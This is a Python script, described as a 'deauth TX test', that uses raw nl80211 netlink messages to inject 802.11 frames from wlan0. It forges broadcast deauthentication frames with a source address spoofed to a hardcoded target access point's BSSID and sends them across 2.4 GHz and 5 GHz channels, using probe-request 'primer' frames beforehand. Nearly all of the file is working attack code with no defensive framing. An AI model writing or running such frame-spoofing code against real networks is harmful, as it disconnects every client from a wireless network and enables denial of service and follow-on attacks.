#!/usr/bin/env python3
"""Simplified deauth TX test using raw netlink.
Uses hardcoded nl80211 family ID from previous tests.
"""
import socket, struct, fcntl, time, sys

IFNAME = b"wlan0"
BSSID = bytes.fromhex("046761d6dc92")
OWN_MAC = bytes.fromhex("5c17cfbca4e3")
TARGET_FREQ = 2412

NETLINK_GENERIC = 16
NLM_F_REQUEST = 1
NLM_F_ACK = 4

NL80211_CMD_FRAME = 55
NL80211_ATTR_IFINDEX = 3
NL80211_ATTR_WIPHY_FREQ = 38
NL80211_ATTR_FRAME = 51
NL80211_ATTR_DONT_WAIT_FOR_ACK = 142

def get_ifindex():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    result = fcntl.ioctl(s, 0x8933, struct.pack('256s', IFNAME))
    s.close()
    return struct.unpack('I', result[16:20])[0]

def get_nl80211_family():
    """Get nl80211 family ID via CTRL_CMD_GETFAMILY"""
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    s.bind((0, 0))
    s.settimeout(3)
    # CTRL_CMD_GETFAMILY=3, CTRL_ATTR_FAMILY_NAME=2
    name = b"nl80211\x00"
    # pad name to 4-byte boundary
    name_padded = name + b'\x00' * ((4 - len(name)%4) %4)
    attr = struct.pack("HH", 4+len(name), 2) + name_padded
    genhdr = struct.pack("BBHI", 3, 1, 0, 0)
    payload = genhdr + attr
    nlhdr = struct.pack("IHHII", 16+len(payload), 16, NLM_F_REQUEST, 1, 0)
    s.send(nlhdr + payload)
    data = s.recv(8192)
    s.close()
    # Parse response: skip nlhdr(16) + genhdr(4), find CTRL_ATTR_FAMILY_ID=1
    off = 20
    while off < len(data) - 4:
        alen, atype = struct.unpack_from("HH", data, off)
        if alen < 4:
            break
        if atype == 1 and alen >= 6:
            return struct.unpack_from("H", data, off+4)[0]
        off += (alen + 3) & ~3
    # Fallback: try reading from /sys
    try:
        import subprocess
        r = subprocess.run(['grep', 'nl80211', '/proc/net/netlink'], capture_output=True, text=True)
        print(f"  /proc/net/netlink nl80211: {r.stdout.strip()}", flush=True)
    except:
        pass
    # Try alternative: use genl_family_find
    return None

def nla(type_id, data):
    padded = data + b'\x00' * ((4 - len(data) % 4) % 4)
    return struct.pack("HH", 4 + len(data), type_id) + padded

def send_frame(sock, fam_id, ifindex, frame, freq, seq=1):
    attrs = b""
    attrs += nla(NL80211_ATTR_IFINDEX, struct.pack("I", ifindex))
    attrs += nla(NL80211_ATTR_WIPHY_FREQ, struct.pack("I", freq))
    attrs += nla(NL80211_ATTR_FRAME, frame)
    attrs += nla(NL80211_ATTR_DONT_WAIT_FOR_ACK, b"")

    genhdr = struct.pack("BBH", NL80211_CMD_FRAME, 1, 0)
    full_payload = genhdr + attrs

    nllen = 16 + len(full_payload)
    nlhdr = struct.pack("IHHII", nllen, fam_id, NLM_F_REQUEST | NLM_F_ACK, seq, 0)

    sock.send(nlhdr + full_payload)

    try:
        resp = sock.recv(4096)
    except socket.timeout:
        return "timeout"

    if len(resp) >= 20:
        msg_type = struct.unpack_from("H", resp, 4)[0]
        if msg_type == 2:  # NLMSG_ERROR
            error = struct.unpack_from("i", resp, 16)[0]
            return error
    return "unknown"

# Build deauth frame: SA=target AP BSSID (spoofed)
def make_deauth(sa, bssid, reason=7):
    f = struct.pack("<H", 0x00c0)       # FC: deauth
    f += struct.pack("<H", 0x0000)      # duration
    f += b'\xff\xff\xff\xff\xff\xff'     # DA: broadcast
    f += sa                              # SA
    f += bssid                           # BSSID
    f += struct.pack("<H", 0)           # seq
    f += struct.pack("<H", reason)      # reason code
    return f

# Build primer (probe req with own MAC)
def make_probe():
    f = struct.pack("<H", 0x0040)       # FC: probe req
    f += struct.pack("<H", 0)           # duration
    f += b'\xff\xff\xff\xff\xff\xff'     # DA
    f += OWN_MAC                        # SA: own
    f += b'\xff\xff\xff\xff\xff\xff'     # BSSID
    f += struct.pack("<H", 0)           # seq
    return f

print("Getting nl80211 family ID...", flush=True)
fam = get_nl80211_family()
print(f"  family={fam}", flush=True)

ifidx = get_ifindex()
print(f"  ifindex={ifidx}", flush=True)

s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
s.bind((0, 0))
s.settimeout(3)

probe = make_probe()
deauth = make_deauth(BSSID, BSSID, reason=7)
deauth_own = make_deauth(OWN_MAC, BSSID, reason=7)

seq = 1

# Test 1: Primer on current freq
print("\n[Test 1] Primer on 5240 MHz (own SA):", flush=True)
rc = send_frame(s, fam, ifidx, probe, 5240, seq); seq+=1
print(f"  rc={rc}", flush=True)

# Test 2: Deauth with own SA on 5240
print("[Test 2] Deauth own SA on 5240 MHz:", flush=True)
rc = send_frame(s, fam, ifidx, deauth_own, 5240, seq); seq+=1
print(f"  rc={rc}", flush=True)

# Test 3: Deauth spoofed on 5240
print("[Test 3] Deauth spoofed SA on 5240 MHz:", flush=True)
rc = send_frame(s, fam, ifidx, probe, 5240, seq); seq+=1
rc2 = send_frame(s, fam, ifidx, deauth, 5240, seq); seq+=1
print(f"  primer={rc} deauth={rc2}", flush=True)

# Test 4: Off-channel 2412 with own SA
print("[Test 4] Deauth own SA on 2412 MHz (off-channel):", flush=True)
rc = send_frame(s, fam, ifidx, deauth_own, 2412, seq); seq+=1
print(f"  rc={rc}", flush=True)

# Test 5: Off-channel 2412 spoofed
print("[Test 5] Deauth spoofed SA on 2412 MHz (off-channel):", flush=True)
rc = send_frame(s, fam, ifidx, probe, 2412, seq); seq+=1
rc2 = send_frame(s, fam, ifidx, deauth, 2412, seq); seq+=1
print(f"  primer={rc} deauth={rc2}", flush=True)

# Test 6: Target 5G BSSID (dc:93) on 5200
BSSID_5G = bytes.fromhex("046761d6dc93")
deauth_5g = make_deauth(BSSID_5G, BSSID_5G, reason=7)
print("[Test 6] Deauth target 5G (dc:93) on 5200 MHz:", flush=True)
rc = send_frame(s, fam, ifidx, probe, 5200, seq); seq+=1
rc2 = send_frame(s, fam, ifidx, deauth_5g, 5200, seq); seq+=1
print(f"  primer={rc} deauth={rc2}", flush=True)

s.close()
print("\nDone! Check dmesg.", flush=True)
